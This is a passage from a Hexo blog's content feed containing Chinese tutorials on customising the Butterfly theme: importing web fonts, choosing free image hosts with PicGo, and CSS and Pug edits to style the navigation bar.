class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line">可变字重 CSS：https://fonts.googleapis.com/css2?family=Noto+Sans+SC:wght@<span class="number">400</span>;<span class="number">500</span>;<span class="number">700</span>&amp;<span class="attribute">display</span>=swap</span><br><span class="line"></span><br><span class="line">该 CSS 可以通过链接控制字重，比如我只想要 <span class="number">400</span> 字重，那么在链接<span class="keyword">@400</span>;<span class="number">500</span>;<span class="number">700</span> 部分修改为<span class="keyword">@400</span>，增加同理。</span><br></pre></td></tr></table></figure><h4 id="小米字体-小米-MIUI-官网"><a href="#小米字体-小米-MIUI-官网" class="headerlink" title="小米字体 - 小米 MIUI 官网"></a>小米字体 - 小米 MIUI 官网</h4><figure class="highlight css"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line">可变字重 CSS：https://font.sec.miui.com/font/css?family=MiSans:<span class="number">400</span>,<span class="number">500</span>,<span class="number">700</span>:Chinese_Simplify,Latin&amp;display=swap</span><br><span class="line"></span><br><span class="line">该 CSS 可以通过链接控制字重，比如我只想要 <span class="number">400</span> 字重，那么在链接 MiSans:<span class="number">400</span>,<span class="number">500</span>,<span class="number">700</span> 部分修改为 MiSans:<span class="number">400</span>，增加同理。</span><br></pre></td></tr></table></figure><h4 id="OPPO-字体-OPPO-网站"><a href="#OPPO-字体-OPPO-网站" class="headerlink" title="OPPO 字体 - OPPO 网站"></a>OPPO 字体 - OPPO 网站</h4><figure class="highlight css"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br></pre></td><td class="code"><pre><span class="line"><span class="number">400</span> 字重 WOFF2：</span><br><span class="line">链接①https://www.oppo.com/content/dam/oppo/common/fonts/font2/new-font/OPPOSansOS2-<span class="number">5000</span>-Regular.woff2</span><br><span class="line">链接②https://code.oppo.com/content/dam/oppo/common/fonts/font2/new-font/OPPOSansOS2-<span class="number">5000</span>-Regular.woff2</span><br><span class="line"></span><br><span class="line"><span class="number">500</span> 字重 WOFF2：</span><br><span class="line">链接①https://www.oppo.com/content/dam/oppo/common/fonts/font2/new-font/OPPOSansOS2-<span class="number">5000</span>-Medium.woff2</span><br><span class="line">链接②https://code.oppo.com/content/dam/oppo/common/fonts/font2/new-font/OPPOSansOS2-<span class="number">5000</span>-Medium.woff2</span><br><span class="line"></span><br><span class="line">该部分为 woff2 字体文件与上述 css 引入方式不同，具体看下述说明。</span><br></pre></td></tr></table></figure><h4 id="OPPO-字体-MasterGo-网站"><a href="#OPPO-字体-MasterGo-网站" class="headerlink" title="OPPO 字体 - MasterGo 网站"></a>OPPO 字体 - MasterGo 网站</h4><figure class="highlight css"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br></pre></td><td class="code"><pre><span class="line"><span class="number">2022</span> 年 <span class="number">11</span> 月 <span class="number">17</span> 日发现已关闭跨域请求，链接仅供下载使用了。</span><br><span class="line"></span><br><span class="line"><span class="number">400</span> 字重 WOFF2：https://static.mastergo.com/static/font/OPPOSans/OPPOSans-Regular.woff2</span><br><span class="line"><span class="number">500</span> 字重 WOFF2：https://static.mastergo.com/static/font/OPPOSans/OPPOSans-Medium.woff2</span><br><span class="line"><span class="number">600</span> 字重 WOFF2：https://static.mastergo.com/static/font/OPPOSans/OPPOSans-Bold.woff2</span><br><span class="line"><span class="number">700</span> 字重 WOFF2：https://static.mastergo.com/static/font/OPPOSans/OPPOSans-Heavy.woff2</span><br></pre></td></tr></table></figure><h4 id="阿里巴巴普惠体-阿里巴巴网站"><a href="#阿里巴巴普惠体-阿里巴巴网站" class="headerlink" title="阿里巴巴普惠体 - 阿里巴巴网站"></a>阿里巴巴普惠体 - 阿里巴巴网站</h4><figure class="highlight css"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">该部分查看 https://fonts.alibabagroup.com/#/font</span><br></pre></td></tr></table></figure><h3 id="外链引入字体"><a href="#外链引入字体" class="headerlink" title="外链引入字体"></a>外链引入字体</h3><ol><li>自定义 css 文件 <code>iconfont.css</code></li><li>引入 <code>@import url(&#39;//s1.hdslb.com/bfs/static/jinkela/long/font/regular.css&#39;);</code></li><li>在 <code>_config.butterfly.yml</code> 中引入自定义 css 文件</li><li>在 <code>_config.butterfly.yml</code> 配置 <code>font-family</code></li></ol><figure class="highlight yaml"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><span class="line"><span class="attr">font:</span></span><br><span class="line">  <span class="attr">global-font-size:</span></span><br><span class="line">  <span class="attr">code-font-size:</span></span><br><span class="line">  <span class="attr">font-family:</span> <span class="string">HarmonyOS_Regular</span></span><br><span class="line">  <span class="attr">code-font-family:</span> <span class="string">consolas</span></span><br></pre></td></tr></table></figure><h3 id="本地引入字体"><a href="#本地引入字体" class="headerlink" title="本地引入字体"></a>本地引入字体</h3><p>将下载好的字体放到项目中</p><p>自定义 css 文件 <code>iconfont.css</code>，这里的 format 转换成各种浏览器支持的格式</p><figure class="highlight css"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">@font-face</span> &#123;</span><br><span class="line">    <span class="attribute">font-family</span>: <span class="string">&#x27;HYTangMeiRen&#x27;</span>;</span><br><span class="line">    <span class="attribute">font-display</span>: swap;</span><br><span class="line">    <span class="attribute">src</span>: <span class="built_in">url</span>(<span class="string">&#x27;/css/HYTangMeiRen55W.ttf&#x27;</span>);</span><br><span class="line">    <span class="attribute">src</span>: <span class="built_in">url</span>(<span class="string">&#x27;/css/HYTangMeiRen55W.ttf&#x27;</span>) <span class="built_in">format</span>(<span class="string">&#x27;embedded-opentype&#x27;</span>),</span><br><span class="line">    <span class="built_in">url</span>(<span class="string">&#x27;/css/HYTangMeiRen55W.ttf&#x27;</span>) <span class="built_in">format</span>(<span class="string">&#x27;woff2&#x27;</span>),</span><br><span class="line">    <span class="built_in">url</span>(<span class="string">&#x27;/css/HYTangMeiRen55W.ttf&#x27;</span>) <span class="built_in">format</span>(<span class="string">&#x27;woff&#x27;</span>),</span><br><span class="line">    <span class="built_in">url</span>(<span class="string">&#x27;/css/HYTangMeiRen55W.ttf&#x27;</span>) <span class="built_in">format</span>(<span class="string">&#x27;truetype&#x27;</span>),</span><br><span class="line">    <span class="built_in">url</span>(<span class="string">&#x27;/css/HYTangMeiRen55W.ttf&#x27;</span>) <span class="built_in">format</span>(<span class="string">&#x27;svg&#x27;</span>);</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p>然后在 <code>_config.butterfly.yml</code> 配置字体</p><figure class="highlight yaml"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><span class="line"><span class="attr">font:</span></span><br><span class="line">  <span class="attr">global-font-size:</span> <span class="string">16px</span></span><br><span class="line">  <span class="attr">code-font-size:</span></span><br><span class="line">  <span class="attr">font-family:</span> <span class="string">HYTangMeiRen,</span> <span class="string">-apple-system,</span> <span class="string">&quot;PingFang SC&quot;</span><span class="string">,</span> <span class="string">&quot;Microsoft YaHei&quot;</span><span class="string">,</span> <span class="string">sans-serif</span></span><br><span class="line">  <span class="attr">code-font-family:</span> <span class="string">consolas,</span> <span class="string">&quot;PingFang SC&quot;</span><span class="string">,</span> <span class="string">&quot;Microsoft YaHei&quot;</span><span class="string">,</span> <span class="string">sans-serif</span></span><br></pre></td></tr></table></figure>]]></content>
      
      
      <categories>
          
          <category> 博客 </category>
          
      </categories>
      
      
        <tags>
            
            <tag> 博客 </tag>
            
        </tags>
      
    </entry>
    
    
    
    <entry>
      <title>图床</title>
      <link href="/2023/03/01/%E5%8D%9A%E5%AE%A2/%E5%9B%BE%E5%BA%8A/"/>
      <url>/2023/03/01/%E5%8D%9A%E5%AE%A2/%E5%9B%BE%E5%BA%8A/</url>
      
        <content type="html"><![CDATA[<meta name="referrer" content="no-referrer"/>## 参考来源<p><a href="https://blog.xlenco.top/posts/7ea9.html">Xlenco | 图床方案汇总</a></p><h2 id="图床"><a href="#图床" class="headerlink" title="图床"></a>图床</h2><p><a href="https://baike.baidu.com/item/%E5%9B%BE%E5%BA%8A/10721348?fr=aladdin">百度百科 | 图床</a></p><p>图床一般是指储存图片的服务器，有国内和国外之分。国外的图床由于有空间距离等因素决定访问速度很慢影响图片显示速度。国内也分为单线空间、多线空间和cdn加速三种。</p><p>随着后续博客的增加，图片也会更多，为了节约生成静态文件的时间和减小服务负担，我们需要用到图床。</p><p>在上传前记得压缩或者使用图床管理工具，有些管理工具会自动帮你压缩。</p><p>我这里使用的是 SM.MS（图床） + PicGo（图床管理工具）。</p><h2 id="常用公共图床"><a href="#常用公共图床" class="headerlink" title="常用公共图床"></a>常用公共图床</h2><table><thead><tr><th>图床</th><th>说明</th></tr></thead><tbody><tr><td><a href="https://sm.ms/">sm.ms</a></td><td>要注册，海外服务器【免费】</td></tr><tr><td><a href="https://moetu.org/">moetu</a></td><td>要注册，国内服务器【免费】</td></tr><tr><td><a href="https://www.z4a.net/">z4a 图床</a></td><td>要注册，国内服务器【免费】</td></tr><tr><td><a href="https://www.imgtp.com/">imgtp</a></td><td>无需注册，国内服务器，最大支持 15MB【免费】</td></tr><tr><td><a href="https://www.imgbed.com/?lang=zh-CN">imgbed</a></td><td>无需注册，国内服务器，最大支持 20MB【免费】</td></tr><tr><td><a href="https://www.superbed.cn/">聚合图床</a></td><td>要注册，国内服务器【免费】</td></tr><tr><td><a href="https://imgbb.com/">imgbb</a></td><td>无需注册，亚太服务器【免费】</td></tr><tr><td><a href="https://upload.cc/">upload</a></td><td>无需注册，海外服务器 【免费】</td></tr><tr><td><a href="https://catbox.moe/">catbox</a></td><td>无需注册，海外服务器【免费】</td></tr><tr><td><a href="https://imgtu.com/">路过图床</a></td><td>要注册，海外服务器【免费】</td></tr><tr><td><a href="https://imgtg.com/">TG 图床</a></td><td>要注册，国内外服务器【免费】</td></tr><tr><td><a href="https://postimages.org/">Postimages</a></td><td>无需注册，国外服务器速度快【免费】</td></tr><tr><td><a href="https://imgloc.com/">imgloc</a></td><td>无需注册，国内服务器，最大支持 6MB【免费】</td></tr><tr><td><a href="https://yh-pic.ihcloud.net/">映画の妖火图床</a></td><td>无需注册，聚合式 CDN 图床【免费】</td></tr><tr><td><a href="https://www.hualigs.cn/">遇见图床</a></td><td>无需注册，聚合式 CDN 图床【免费】</td></tr><tr><td><a href="https://www.helloimg.com/">hello 图床</a></td><td>要注册，国内 CDN【免费】</td></tr><tr><td><a href="https://im.ge/">IM.GE</a></td><td>无需注册香港 CDN【免费】</td></tr><tr><td><a href="https://cloudimge.com/">云图床</a></td><td>全球 CDN【免费】</td></tr></tbody></table><h2 id="图床管理工具"><a href="#图床管理工具" class="headerlink" title="图床管理工具"></a>图床管理工具</h2><p><a href="https://molunerfinn.com/PicGo/">PicGo</a></p><h2 id="方案"><a href="#方案" class="headerlink" title="方案"></a>方案</h2><p>SM.MS + PicGo</p><h3 id="SM-MS"><a href="#SM-MS" class="headerlink" title="SM.MS"></a>SM.MS</h3><ol><li>打开 <a href="https://sm.ms/">sm.ms</a></li><li>使用邮箱注册，邮箱里面验证</li><li>登录之后可关联 github，google</li><li>生成 token</li></ol><h3 id="PicGo"><a href="#PicGo" class="headerlink" title="PicGo"></a>PicGo</h3><ol><li>打开 <a href="https://molunerfinn.com/PicGo/">PicGo</a></li><li>下载自己所需版本</li><li>配置 SM.MS 配置文件</li></ol><p><img src="https://s2.loli.net/2023/03/04/xjLzk42NpQUGSVT.png" alt="图床-SM.MS配置"></p>]]></content>
      
      
      <categories>
          
          <category> 博客 </category>
          
      </categories>
      
      
        <tags>
            
            <tag> 博客 </tag>
            
        </tags>
      
    </entry>
    
    
    
    <entry>
      <title>导航栏</title>
      <link href="/2023/03/01/%E5%8D%9A%E5%AE%A2/%E5%AF%BC%E8%88%AA%E6%A0%8F/"/>
      <url>/2023/03/01/%E5%8D%9A%E5%AE%A2/%E5%AF%BC%E8%88%AA%E6%A0%8F/</url>
      
        <content type="html"><![CDATA[<meta name="referrer" content="no-referrer"/><h2 id="参考来源"><a href="#参考来源" class="headerlink" title="参考来源"></a>参考来源</h2><p><a href="https://yisous.xyz/posts/895003b5/">Ariasaka | 关于Butterfly的导航栏的一些教程</a></p><h2 id="版本"><a href="#版本" class="headerlink" title="版本"></a>版本</h2><ul><li>Node: 12.13.0</li><li>Hexo: 6.3.0</li><li>Butterfly: 4.7.0</li></ul><h2 id="方案"><a href="#方案" class="headerlink" title="方案"></a>方案</h2><h3 id="开启本地搜索"><a href="#开启本地搜索" class="headerlink" title="开启本地搜索"></a>开启本地搜索</h3><p><a href="https://butterfly.js.org/posts/ceeb73f/#%E6%90%9C%E7%B4%A2%E7%B3%BB%E7%B5%B1">Butterfly | Butterfly 安装文档(四) 主题配置-2</a></p><h3 id="搜索栏居右"><a href="#搜索栏居右" class="headerlink" title="搜索栏居右"></a>搜索栏居右</h3><p>我们将搜索框放在最右侧，并隐藏搜索只显示图标</p><p>修改 <code>\themes\Butterfly\layout\includes\header\nav.pug</code></p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br></pre></td><td class="code"><pre><span class="line">nav#nav</span><br><span class="line">  span#blog-info</span><br><span class="line">    a(href=url_for(&#x27;/&#x27;) title=config.title)</span><br><span class="line">      if theme.nav.logo</span><br><span class="line">        img.site-icon(src=url_for(theme.nav.logo))</span><br><span class="line">      if theme.nav.display_title</span><br><span class="line">        span.site-name=config.title</span><br><span class="line"></span><br><span class="line">  #menus</span><br><span class="line">  !=partial(&#x27;includes/header/menu_item&#x27;, &#123;&#125;, &#123;cache: true&#125;)</span><br><span class="line"></span><br><span class="line">  #nav-right</span><br><span class="line">    if (theme.algolia_search.enable || theme.local_search.enable || theme.docsearch.enable)</span><br><span class="line">      #search-button</span><br><span class="line">        a.site-page.social-icon.search(href=&quot;javascript:void(0);&quot;)</span><br><span class="line">          i.fas.fa-search.fa-fw</span><br><span class="line"></span><br><span class="line">      #toggle-menu</span><br><span class="line">        a.site-page(href=&quot;javascript:void(0);&quot;)</span><br><span class="line">          i.fas.fa-bars.fa-fw</span><br></pre></td></tr></table></figure><p>修改完成之后，效果就是这样</p><p><img src="https://s2.loli.net/2023/03/05/REFUBOaI7y83pZq.png" alt="搜索栏居右效果图"></p><h3 id="导航栏居中"><a href="#导航栏居中" class="headerlink" title="导航栏居中"></a>导航栏居中</h3><p>效果如下：</p><p><img src="https://s2.loli.net/2023/03/05/Y1sFoUJO7MgxmbX.png" alt="导航栏居中效果图"></p><p>在自定义 <code>nav.css</code> 中添加如下的 css</p><figure class="highlight css"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br></pre></td><td class="code"><pre><span class="line"><span class="selector-id">#nav-right</span> &#123;</span><br><span class="line">    <span class="attribute">flex</span>: <span class="number">1</span> <span class="number">1</span> auto;</span><br><span class="line">    <span class="attribute">justify-content</span>: flex-end;</span><br><span class="line">    <span class="attribute">margin-left</span>: auto;</span><br><span class="line">    <span class="attribute">display</span>: flex;</span><br><span class="line">    <span class="attribute">flex-wrap</span>: nowrap;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><h3 id="导航栏效果增强"><a href="#导航栏效果增强" class="headerlink" title="导航栏效果增强"></a>导航栏效果增强</h3><p>效果图：</p><p><img src="https://s2.loli.net/2023/03/05/5kxa81bPJdUOs3I.png" alt="导航栏效果增强效果图"></p><p>原主题 hover 是蓝色的</p><p>在自定义 <code>nav.css</code> 中添加如下的 css</p><figure class="highlight css"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br></pre></td><td class="code"><pre><span class="line"><span class="selector-id">#nav</span> *<span class="selector-pseudo">::after</span> &#123;</span><br><span class="line">    <span class="attribute">background-color</span>: transparent <span class="meta">!important</span>;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="selector-id">#nav</span> &#123;</span><br><span class="line">    <span class="attribute">font-size</span>: <span class="number">22px</span> <span class="meta">!important</span>;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="selector-class">.site-page</span> &#123;</span><br><span class="line">    <span class="attribute">padding</span>: <span class="number">5px</span>;</span><br><span class="line">    <span class="attribute">margin</span>: <span class="number">3px</span>;</span><br><span class="line">    <span class="attribute">padding-left</span>: <span class="number">10px</span>;</span><br><span class="line">    <span class="attribute">padding-right</span>: <span class="number">10px</span>;</span><br><span class="line">    <span class="attribute">white-space</span>: nowrap;</span><br><span class="line">    <span class="attribute">font-size</span>: <span class="number">0.78em</span>;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="selector-class">.site-page</span><span class="selector-pseudo">:hover</span> &#123;</span><br><span class="line">    <span class="attribute">background-color</span>: <span class="built_in">var</span>(--mlemontx-theme);</span><br><span class="line">    <span class="attribute">box-shadow</span>: <span class="number">0</span> <span class="number">0</span> <span class="number">3px</span> <span class="built_in">var</span>(--mlemontx-theme) <span class="meta">!important</span>;</span><br><span class="line">    <span class="attribute">border-radius</span>: <span class="number">7px</span>;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="selector-class">.site-page</span><span class="selector-class">.child</span><span class="selector-pseudo">:hover</span> &#123;</span><br><span class="line">    <span class="attribute">background-color</span>: <span class="built_in">var</span>(--mlemontx-theme) <span class="meta">!important</span>;</span><br><span class="line">    <span class="attribute">box-shadow</span>: <span class="number">0</span> <span class="number">0</span> <span class="number">3px</span> <span class="built_in">var</span>(--mlemontx-theme) <span class="meta">!important</span>;</span><br><span class="line">    <span class="attribute">border-radius</span>: <span class="number">4px</span>;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><h3 id="子菜单横向布局"><a href="#子菜单横向布局" class="headerlink" title="子菜单横向布局"></a>子菜单横向布局</h3><p>效果如下：</p><p><img src="https://s2.loli.net/2023/03/05/DjZusMYhxoGwp7Q.png" alt="子菜单横向布局效果图"></p><p>在自定义 <code>nav.css</code> 中添加如下的 css</p><figure class="highlight css"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br></pre></td><td class="code"><pre><span class="line"><span class="selector-class">.menus_item_child</span> <span class="selector-tag">li</span><span class="selector-pseudo">:not</span>(<span class="selector-id">#sidebar-menus</span> <span class="selector-tag">li</span>) &#123;</span><br><span class="line">    <span class="attribute">float</span>: left;</span><br><span class="line">    <span class="attribute">border-radius</span>: <span class="number">6px</span> <span class="meta">!important</span>;</span><br><span class="line">    -webkit-<span class="attribute">border-radius</span>: <span class="number">6px</span> <span class="meta">!important</span>;</span><br><span class="line">    -moz-<span class="attribute">border-radius</span>: <span class="number">6px</span> <span class="meta">!important</span>;</span><br><span class="line">    -ms-<span class="attribute">border-radius</span>: <span class="number">6px</span> <span class="meta">!important</span>;</span><br><span class="line">    -o-<span class="attribute">border-radius</span>: <span class="number">6px</span> <span class="meta">!important</span>;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="selector-class">.menus_item_child</span><span class="selector-pseudo">:not</span>(<span class="selector-id">#sidebar-menus</span> <span class="selector-tag">ul</span>) &#123;</span><br><span class="line">    <span class="attribute">left</span>: <span class="number">50%</span>;</span><br><span class="line">    translate: -<span class="number">50%</span>;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><h3 id="网站标题效果增强"><a href="#网站标题效果增强" class="headerlink" title="网站标题效果增强"></a>网站标题效果增强</h3><p>效果如下：</p><p><img src="https://s2.loli.net/2023/03/05/3kW1OqFrIUbgchZ.png" alt="网站标题效果增强效果图"></p><p>默认的标题非常简单，就是一个a标签，按下来就返回主页</p><p>在自定义 <code>nav.css</code> 中添加如下的 css，将 <code>--mlemontx-theme</code> 替换成自己喜欢的颜色</p><figure class="highlight css"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br></pre></td><td class="code"><pre><span class="line"><span class="selector-id">#blog-info</span> <span class="selector-tag">a</span> &#123;</span><br><span class="line">    <span class="attribute">padding</span>: <span class="number">8px</span></span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="selector-class">.site-name</span><span class="selector-pseudo">::before</span> &#123;</span><br><span class="line">    <span class="attribute">opacity</span>: <span class="number">0</span>;</span><br><span class="line">    <span class="attribute">background-color</span>: <span class="built_in">var</span>(--mlemontx-theme) <span class="meta">!important</span>;</span><br><span class="line">    <span class="attribute">border-radius</span>: <span class="number">12px</span>;</span><br><span class="line">    -webkit-<span class="attribute">border-radius</span>: <span class="number">12px</span>;</span><br><span class="line">    -moz-<span class="attribute">border-radius</span>: <span class="number">12px</span>;</span><br><span class="line">    -ms-<span class="attribute">border-radius</span>: <span class="number">12px</span>;</span><br><span class="line">    -o-<span class="attribute">border-radius</span>: <span class="number">12px</span>;</span><br><span class="line">    <span class="attribute">transition</span>: .<span class="number">3s</span>;</span><br><span class="line">    -webkit-<span class="attribute">transition</span>: .<span class="number">3s</span>;</span><br><span class="line">    -moz-<span class="attribute">transition</span>: .<span class="number">3s</span>;</span><br><span class="line">    -ms-<span class="attribute">transition</span>: .<span class="number">3s</span>;</span><br><span class="line">    -o-<span class="attribute">transition</span>: .<span class="number">3s</span>;</span><br><span class="line">    <span class="attribute">position</span>: absolute;</span><br><span class="line">    <span class="attribute">top</span>: <span class="number">0</span> <span class="meta">!important</span>;</span><br><span class="line">    <span class="attribute">right</span>: <span class="number">0</span> <span class="meta">!important</span>;</span><br><span class="line">    <span class="attribute">width</span>: <span class="number">100%</span>;</span><br><span class="line">    <span class="attribute">height</span>: <span class="number">100%</span>;</span><br><span class="line">    <span class="attribute">content</span>: <span class="string">&quot;\f015&quot;</span>;</span><br><span class="line">    <span class="attribute">box-shadow</span>: <span class="number">0</span> <span class="number">0</span> <span class="number">5px</span> <span class="built_in">var</span>(--mlemontx-theme);</span><br><span class="line">    <span class="attribute">font-family</span>: <span class="string">&quot;Font Awesome 6 Free&quot;</span>;</span><br><span class="line">    <span class="attribute">text-align</span>: center;</span><br><span class="line">    <span class="attribute">color</span>: white;</span><br><span class="line">    <span class="attribute">line-height</span>: <span class="number">34px</span>;</span><br><span class="line">    <span class="attribute">font-size</span>: <span class="number">18px</span>;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="selector-class">.site-name</span><span class="selector-pseudo">:hover</span><span class="selector-pseudo">::before</span> &#123;</span><br><span class="line">    <span class="attribute">opacity</span>: <span class="number">1</span>;</span><br><span class="line">    scale: <span class="number">1.03</span>;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="selector-class">.site-name</span> &#123;</span><br><span class="line">    <span class="attribute">position</span>: relative;</span><br><span class="line">    <span class="attribute">font-size</span>: <span class="number">24px</span>;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><h3 id="顶栏常驻"><a href="#顶栏常驻" class="headerlink" title="顶栏常驻"></a>顶栏常驻</h3><p>butterfly 的顶栏滚动时会自动收起，在自定义 <code>nav.css</code> 中添加如下的 css 来固定</p><figure class="highlight css"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br></pre></td><td class="code"><pre><span class="line"><span class="selector-class">.nav-fixed</span> <span class="selector-id">#nav</span> &#123;</span><br><span class="line">    <span class="attribute">transform</span>: <span class="built_in">translateY</span>(<span class="number">58px</span>) <span class="meta">!important</span>;</span><br><span class="line">    -webkit-<span class="attribute">transform</span>: <span class="built_in">translateY</span>(<span class="number">58px</span>) <span class="meta">!important</span>;</span><br><span class="line">    -moz-<span class="attribute">transform</span>: <span class="built_in">translateY</span>(<span class="number">58px</span>) <span class="meta">!important</span>;</span><br><span class="line">    -ms-<span class="attribute">transform</span>: <span class="built_in">translateY</span>(<span class="number">58px</span>) <span class="meta">!important</span>;</span><br><span class="line">    -o-<span class="attribute">transform</span>: <span class="built_in">translateY</span>(<span class="number">58px</span>) <span class="meta">!important</span>;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="selector-id">#nav</span> &#123;</span><br><span class="line">    <span class="attribute">transition</span>: none <span class="meta">!important</span>;</span><br><span class="line">    -webkit-<span class="attribute">transition</span>: none <span class="meta">!important</span>;</span><br><span class="line">    -moz-<span class="attribute">transition</span>: none <span class="meta">!important</span>;</span><br><span class="line">    -ms-<span class="attribute">transition</span>: none <span class="meta">!important</span>;</span><br><span class="line">    -o-<span class="attribute">transition</span>: none <span class="meta">!important</span>;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><blockquote><p>改css的方式会出现一个bug：在滚动到顶部的时候再滚下来会闪一下</p></blockquote><h3 id="显示标题"><a href="#显示标题" class="headerlink" title="显示标题"></a>显示标题</h3><p>效果图下：</p><p><img src="https://s2.loli.net/2023/03/05/uHKevwYNtBRmqyk.png" alt="显示标题效果图"></p><p>鼠标向上移动时就自动显示导航，向下移动就显示标题</p><p>首先修改 <code>\themes\Butterfly\layout\includes\header\nav.pug</code></p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br></pre></td><td class="code"><pre><span class="line">nav#nav</span><br><span class="line">  span#blog-info</span><br><span class="line">    a(href=url_for(&#x27;/&#x27;) title=config.title)</span><br><span class="line">      if theme.nav.logo</span><br><span class="line">        img.site-icon(src=url_for(theme.nav.logo))</span><br><span class="line">      if theme.nav.display_title</span><br><span class="line">        span.site-name=config.title</span><br><span class="line"></span><br><span class="line">  #menus</span><br><span class="line">  !=partial(&#x27;includes/header/menu_item&#x27;, &#123;&#125;, &#123;cache: true&#125;)</span><br><span class="line">  center(id=&quot;name-container&quot;)</span><br><span class="line">    a(id=&quot;page-name&quot; href=&quot;javascript:scrollToTop()&quot;) PAGE_NAME</span><br><span class="line"></span><br><span class="line">  #nav-right</span><br><span class="line">    if (theme.algolia_search.enable || theme.local_search.enable || theme.docsearch.enable)</span><br><span class="line">      #search-button</span><br><span class="line">        a.site-page.social-icon.search(href=&quot;javascript:void(0);&quot;)</span><br><span class="line">          i.fas.fa-search.fa-fw</span><br><span class="line"></span><br><span class="line">      #toggle-menu</span><br><span class="line">        a.site-page(href=&quot;javascript:void(0);&quot;)</span><br><span class="line">          